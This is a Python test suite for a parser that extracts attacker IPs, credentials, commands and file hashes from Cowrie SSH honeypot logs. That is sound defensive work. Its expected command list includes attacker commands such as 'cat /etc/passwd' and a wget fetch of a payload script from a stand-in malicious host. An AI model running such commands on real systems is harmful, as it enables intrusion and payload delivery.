"""
Test suite for Cowrie JSON Parser.
Ensures accurate extraction of TTPs and IoCs from SSH honeypot logs.

Part of MAXIMUS VÉRTICE - Projeto Tecido Reativo
Sprint 1 Complete Test Suite
"""

import pytest
from pathlib import Path
from backend.services.reactive_fabric_analysis.parsers import CowrieJSONParser


class TestCowrieParserExtraction:
    """Test data extraction from Cowrie logs."""
    
    @pytest.mark.asyncio
    async def test_extracts_credentials(self, sample_cowrie_log: Path):
        """Test Cowrie parser extracts credentials correctly."""
        parser = CowrieJSONParser()
        result = await parser.parse(sample_cowrie_log)
        
        assert result["attacker_ip"] == "45.142.120.15"
        assert ("root", "toor") in result["credentials"]
        assert len(result["credentials"]) >= 1
    
    @pytest.mark.asyncio
    async def test_extracts_commands(self, sample_cowrie_log: Path):
        """Test Cowrie parser extracts executed commands."""
        parser = CowrieJSONParser()
        result = await parser.parse(sample_cowrie_log)
        
        assert "uname -a" in result["commands"]
        assert "whoami" in result["commands"]
        assert "cat /etc/passwd" in result["commands"]
        assert "wget http://malicious.com/payload.sh" in result["commands"]
        assert len(result["commands"]) >= 4
    
    @pytest.mark.asyncio
    async def test_extracts_file_hashes(self, sample_cowrie_log: Path):
        """Test Cowrie parser extracts downloaded file hashes."""
        parser = CowrieJSONParser()
        result = await parser.parse(sample_cowrie_log)
        
        assert "5d41402abc4b2a76b9719d911017c592" in result["file_hashes"]
    
    @pytest.mark.asyncio
    async def test_extracts_attacker_ip(self, sample_cowrie_log: Path):
        """Test Cowrie parser extracts attacker IP."""
        parser = CowrieJSONParser()
        result = await parser.parse(sample_cowrie_log)
        
        assert result["attacker_ip"] == "45.142.120.15"
        assert isinstance(result["attacker_ip"], str)


class TestCowrieParserErrorHandling:
    """Test error handling and resilience."""
    
    @pytest.mark.asyncio
    async def test_handles_malformed_lines(self, malformed_cowrie_log: Path):
        """Test Cowrie parser handles malformed JSON gracefully."""
        parser = CowrieJSONParser()
        result = await parser.parse(malformed_cowrie_log)
        
        # Should skip malformed line and continue
        assert "whoami" in result["commands"]
    
    @pytest.mark.asyncio
    async def test_handles_empty_file(self, empty_cowrie_log: Path):
        """Test Cowrie parser handles empty log file."""
        parser = CowrieJSONParser()
        result = await parser.parse(empty_cowrie_log)
        
        assert result["commands"] == []
        assert result["credentials"] == []
        assert result["file_hashes"] == []
    
    @pytest.mark.asyncio
    async def test_raises_on_nonexistent_file(self):
        """Test parser raises FileNotFoundError on missing file."""
        parser = CowrieJSONParser()
        nonexistent = Path("/tmp/nonexistent_cowrie_12345.json")
        
        with pytest.raises(FileNotFoundError):
            await parser.parse(nonexistent)


class TestCowrieParserFileSupport:
    """Test file type detection."""
    
    def test_supports_json_files(self):
        """Test parser supports JSON files."""
        parser = CowrieJSONParser()
        
        assert parser.supports(Path("/forensics/cowrie.json")) is True
        assert parser.supports(Path("/forensics/cowrie_20251012.json")) is True
        assert parser.supports(Path("/data/session.json")) is True
    
    def test_rejects_non_json_files(self):
        """Test parser rejects non-JSON files."""
        parser = CowrieJSONParser()
        
        assert parser.supports(Path("/forensics/traffic.pcap")) is False
        assert parser.supports(Path("/forensics/log.txt")) is False
        assert parser.supports(Path("/forensics/data.csv")) is False


class TestCowrieParserMetadata:
    """Test metadata extraction."""
    
    @pytest.mark.asyncio
    async def test_extracts_file_metadata(self, sample_cowrie_log: Path):
        """Test parser extracts file metadata."""
        parser = CowrieJSONParser()
        result = await parser.parse(sample_cowrie_log)
        
        assert "metadata" in result
        metadata = result["metadata"]
        
        assert "filename" in metadata
        assert "file_size_bytes" in metadata
        assert "file_hash" in metadata
        assert metadata["file_size_bytes"] > 0


class TestCowrieParserAttackTypeDetection:
    """Test attack type classification."""
    
    @pytest.mark.asyncio
    async def test_detects_ssh_brute_force(self, sample_cowrie_log: Path):
        """Test parser detects SSH brute force attacks."""
        parser = CowrieJSONParser()
        result = await parser.parse(sample_cowrie_log)
        
        assert result["attack_type"] in ["ssh_brute_force", "ssh_login", "ssh"]


class TestCowrieParserSessionHandling:
    """Test session tracking."""
    
    @pytest.mark.asyncio
    async def test_tracks_sessions(self, sample_cowrie_log: Path):
        """Test parser tracks session information."""
        parser = CowrieJSONParser()
        result = await parser.parse(sample_cowrie_log)
        
        assert "sessions" in result
        assert len(result["sessions"]) >= 1
        
        # Check session has required fields
        if result["sessions"]:
            session = result["sessions"][0]
            assert "id" in session or "session_id" in session


class TestCowrieParserDataStructure:
    """Test output data structure compliance."""
    
    @pytest.mark.asyncio
    async def test_returns_required_keys(self, sample_cowrie_log: Path):
        """Test parser returns all required keys."""
        parser = CowrieJSONParser()
        result = await parser.parse(sample_cowrie_log)
        
        required_keys = [
            "attacker_ip",
            "attack_type",
            "commands",
            "credentials",
            "file_hashes",
            "timestamps",
            "sessions"
        ]
        
        for key in required_keys:
            assert key in result, f"Missing required key: {key}"
    
    @pytest.mark.asyncio
    async def test_returns_correct_types(self, sample_cowrie_log: Path):
        """Test parser returns correct data types."""
        parser = CowrieJSONParser()
        result = await parser.parse(sample_cowrie_log)
        
        assert isinstance(result["attacker_ip"], (str, type(None)))
        assert isinstance(result["attack_type"], str)
        assert isinstance(result["commands"], list)
        assert isinstance(result["credentials"], list)
        assert isinstance(result["file_hashes"], list)
        assert isinstance(result["timestamps"], list)
        assert isinstance(result["sessions"], list)
